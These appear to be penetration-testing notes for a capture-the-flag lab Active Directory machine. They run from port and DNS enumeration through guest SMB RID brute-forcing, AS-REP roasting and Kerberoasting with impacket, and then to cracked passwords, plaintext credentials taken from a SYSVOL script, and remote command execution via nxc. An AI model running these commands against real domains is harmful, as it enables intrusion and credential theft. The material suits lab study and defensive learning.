# Vulnnet-Roasted (10.10.34.179)

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-23 11:15:06Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49683/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49724/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:window
```
- no responder or IPv6 poisoning

# DNS

all records:
```bash
dig any vulnnet-rst.local @10.10.34.179

vulnnet-rst.local.      600     IN      A       10.0.2.15
vulnnet-rst.local.      600     IN      A       192.168.1.134
vulnnet-rst.local.      3600    IN      NS      win-2bo8m1oe1m1.vulnnet-rst.local.
vulnnet-rst.local.      3600    IN      SOA     win-2bo8m1oe1m1.vulnnet-rst.local. hostmaster.vulnnet-rst.local. 40 900 600 86400 3600
vulnnet-rst.local.      600     IN      AAAA    2a01:115f:a0a:5200:6044:7145:2a3f:d0b
```

# SMB

- no null session
- no null session with username
- no null session with password
- Guest account enabled
  - 2 shares access:
```bash
nxc smb 10.10.34.179 -u 'Guest' -p '' --shares
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\Guest: 
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  [*] Enumerated shares
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  NETLOGON                        Logon server share 
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  SYSVOL                          Logon server share 
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing                                                                                                                 
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```

- rid brute:
```bash
nxc smb 10.10.34.179 -u 'Guest' -p '' --rid-brute
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\Guest: 
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                                             
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                                             
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)                                                                                                              
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.10.34.179   445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)
```

- extracted users:
```txt
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
a-whitehat
t-skid
j-goldenhand
j-leet
```

# Kerberos

- user t-skid has `UF_DONT_REQUIRE_PREAUTH`:
```bash
impacket-GetNPUsers  vulnnet-rst.local/ -usersfile loot/users.txt 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:5b66f1ba09c4b5566e0d34fd305d7ac4$13f2e93815e7bc0813295929244eaeacd1765790730d4e766587418299297c7aa9123b9d2cd6d500c0491b396472ae3027755b1a58677d1d759ef9b06c08fddccbe001a423679ad863302626af6865a851b37e515f4a7858e03ac90070d28461b513b870952c602d4a4e85defaa903c78ccf740eb04ad3eb771f631c071aff9b8d04b58b6b29b549b01b71b58f968f7094f73e9ef05448993c83b046c24f6e158dd82239087aad837f1db033e773eb1de69c198a540eab66acb50259cee01599034aef82facdc0299f19a22ad92bcbdfca0a2c621e16b27800db82a3393372986a2629470d2fe17e0e8567572b3ac653ba41b895d544
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- cracked pass: `tj072889*`

- kerberoast user:
```bash
impacket-GetUserSPNs -dc-ip 10.10.34.179 vulnnet-rst.local/t-skid   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 20:45:09.913979  2021-03-14 00:41:17.987528 
```

- with "-request" we get the hash:
```bash
impacket-GetUserSPNs -dc-ip 10.10.34.179 vulnnet-rst.local/t-skid -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 20:45:09.913979  2021-03-14 00:41:17.987528             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$d9da8abaec5ba8dd619ab32e34d0a9e1$2a683ef8b060859765db730f4e9e29ad3301cb2931fb15df19bfe21804d27089560ce8b48649ccd4e580c37afe7b47066882508cfb968a429169ffc1e600ff20e2a24dd5788436da01c53a0486553fe841059f7a6a349afb04600d77132799204972eabee6ea76ae327172c77874256db88c1e0b5081cfb3da9afaa551274a6119987612bfdd9f6bf48de39e7a4e35d921abaf7982959ec27892bafad386becae019d8e5dbbcaa23f06801e3794fdbcda5056c4a52cf6a23f28cc6da689d8d61922d89a303e03a33b56626dc98dcd1a2a40f26ff0c925ca26856e71841619bf0f81d0cb8973d3f38ce412c42b6da4724acfebee6d92df30507e510fcd026dd2a7a0b7e2475110b0c14af5cf0b1b27feef39c698924d1991f3d6879d7f2b0a24bcba307dfc0d2d8225e0cae1381a1277cdd3877d0970c013692d0e456abd84a7316c1d58f448d03d16ca35c4ef0d52dfa48d2016fd8d6899f73c8f04ab36eed5dcfc676bde409243f0969f947c6ff24155490c1315e6c4fbaabfc290bdc1d37d60caa66f50e9fe3aea32a7da966b840324de02cfe1ae62f4b0ad5b37e1851811d16b60115ed9c2735134392b78baf4ac0df4eb4a64511c6233c668682fde9956108801320028ba65fed88459a14e7e565115fd70e5c1df502a387ab882b130ade40d617fbaf02f70c829e57d3163b8412314562bd8beab14738c49bba484f2bed1b37347d148c142f6d0152ccdf59e4c6fde5b30e90c8c256e1e8afcfd77d28a0dd18fc0fbe4e218387df0d1a9f72f282bf4c7f0e29adf79c1b3e2409fe00c8f818667e619b4d719495335c3402af6284fefd206cc8b70ea21ed086663b40fd071b4871e597c9d3dec95f8cc746b77bc5fcc9138f679438a24a62121dc8a421acb9fd690276ce5ebb75f8129950f015358dc3fdcae0af389933bb9a1f4d13772cd381ca798f3b9e3afee9a81fb00af2fc55fcd552a538d957e8a2becb4c5e5ea07fe74fb150a6214028b33f53736ef332a6cfcd33c507c74e6759969579d40899eb0a330349c0c80ad71c9f4965f8acb8d28510b578ed92fafcfae51a82bc93cdb4e5c24ec5a0d4c9ca31f8bc9f5e8f1328139857f0ed73cd0f5439ede177fcf56534f3686dae84ee6574039f312d404cf33e4109118f27ba72ef03e691524957b84083f5fca0382a5b18652e6c5f4253b4fdfba3baa9c3b8c160a785be8f0d493d28ab027ead6aceeb81b3e1e88886b7e82305463fec00bb0a5d7d058f6706fb50c26302072ec42d5e9357e0c4a7360d69234e54ac18793f4cbc0fb1d541d911292bc8e311e1242ac86b9c4f392afc6f48b2c5d5afb02e70d4b162b4c6385c86182ba9674daa65166648a605a9c5fc4ebde90088d4900f54216ffce4ec
```

- cracked pass: 'ry=ibfkfv,s6h,'

# SMB

- access to SYSVOL
- script for reset password: "ResetPassword.vbs"
- found creds inside for LDAP bind:
```vbs
<SNIP>
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
<SNIP>
```
- root access as a-whitehat:
```bash
nxc smb 10.10.34.179 -u 'a-whitehat'  -p 'bNdKVkjv3RR9ht' -x whoami
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False) 
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  [+] Executed command via wmiexec
SMB         10.10.34.179    445    WIN-2BO8M1OE1M1  vulnnet-rst\a-whitehat
```
